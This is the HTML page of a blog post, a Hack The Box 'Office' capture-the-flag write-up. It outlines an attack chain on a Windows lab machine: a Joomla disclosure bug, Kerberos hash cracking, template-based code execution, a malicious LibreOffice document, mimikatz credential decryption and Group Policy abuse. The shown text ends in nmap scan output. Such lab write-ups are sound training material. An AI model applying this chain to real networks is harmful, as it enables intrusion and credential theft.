@@ -1,0 +1,1775 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=18d79529ed1a410777646c1aaed0e478c964ecf8">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Office writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HTB Office writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Office is a Hard Windows machine in which we have to do the following things. First, we have a Joomla web vulnerable to a unauthenticated information disclosure that later will give us access to SMB with user dwolfe that we enumerated before with kerbrute. In this SMB access, we have a “SOC Analysis” share that we have access which has a pcap file in which we can see a krb5 hash for user tstark. This hash is crackable and we can login into joomla to later modify a template and gain access as web_account. Then, we can see user.txt by executing a command as user tstark with the password cracked before using RunasCs. Next, it’s possible to gain access as user ppotts by using a internal web and upload a .odt file crafted to exploit CVE-2023-2255 of LibreOffice. Consequently, we can see some DPAPI credentials that when decrypted with mimikatz, it reveals password for hhogan. Finally, in bloodhound we can see that a group which hhogan belongs can modify the Group Policy and consequently add himself to administrators group." />
+<meta property="og:description" content="Office is a Hard Windows machine in which we have to do the following things. First, we have a Joomla web vulnerable to a unauthenticated information disclosure that later will give us access to SMB with user dwolfe that we enumerated before with kerbrute. In this SMB access, we have a “SOC Analysis” share that we have access which has a pcap file in which we can see a krb5 hash for user tstark. This hash is crackable and we can login into joomla to later modify a template and gain access as web_account. Then, we can see user.txt by executing a command as user tstark with the password cracked before using RunasCs. Next, it’s possible to gain access as user ppotts by using a internal web and upload a .odt file crafted to exploit CVE-2023-2255 of LibreOffice. Consequently, we can see some DPAPI credentials that when decrypted with mimikatz, it reveals password for hhogan. Finally, in bloodhound we can see that a group which hhogan belongs can modify the Group Policy and consequently add himself to administrators group." />
+<link rel="canonical" href="http://localhost:4000/writeups/HTB/Office.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/HTB/Office.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-21T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Office writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-06-21T00:00:00+02:00","datePublished":"2024-06-21T00:00:00+02:00","description":"Office is a Hard Windows machine in which we have to do the following things. First, we have a Joomla web vulnerable to a unauthenticated information disclosure that later will give us access to SMB with user dwolfe that we enumerated before with kerbrute. In this SMB access, we have a “SOC Analysis” share that we have access which has a pcap file in which we can see a krb5 hash for user tstark. This hash is crackable and we can login into joomla to later modify a template and gain access as web_account. Then, we can see user.txt by executing a command as user tstark with the password cracked before using RunasCs. Next, it’s possible to gain access as user ppotts by using a internal web and upload a .odt file crafted to exploit CVE-2023-2255 of LibreOffice. Consequently, we can see some DPAPI credentials that when decrypted with mimikatz, it reveals password for hhogan. Finally, in bloodhound we can see that a group which hhogan belongs can modify the Group Policy and consequently add himself to administrators group.","headline":"HTB Office writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Office.html"},"url":"http://localhost:4000/writeups/HTB/Office.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Office writeup</span> <span class="points"> [40 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+<p>Office is a Hard Windows machine in which we have to do the following things. First, we have a Joomla web vulnerable to a <a href="https://github.com/Acceis/exploit-CVE-2023-23752">unauthenticated information disclosure</a> that later will give us access to SMB with user dwolfe that we enumerated before with kerbrute. In this SMB access, we have a “SOC Analysis” share that we have access which has a pcap file in which we can see a krb5 hash for user tstark. This hash is crackable and we can login into joomla to later modify a template and gain access as web_account. Then, we can see user.txt by executing a command as user tstark with the password cracked before using RunasCs. Next, it’s possible to gain access as user ppotts by using a internal web and upload a .odt file crafted to exploit CVE-2023-2255 of LibreOffice. Consequently, we can see some DPAPI credentials that when decrypted with mimikatz, it reveals password for hhogan. Finally, in bloodhound we can see that a group which hhogan belongs can modify the Group Policy and consequently add himself to administrators group.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.3
+# Nmap 7.94SVN scan initiated Thu Apr 18 21:51:12 2024 as: nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.3
+Nmap scan report for 10.10.11.3
+Host is up (0.11s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+|_http-generator: Joomla! - Open Source Content Management
+|_http-title: Home
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+| http-robots.txt: 16 disallowed entries (15 shown)
+| /joomla/administrator/ /administrator/ /api/ /bin/ 
+| /cache/ /cli/ /components/ /includes/ /installation/ 
+|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-19 03:51:44Z)
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
+|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
+443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+| tls-alpn: 
+|_  http/1.1
+|_http-title: 403 Forbidden
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
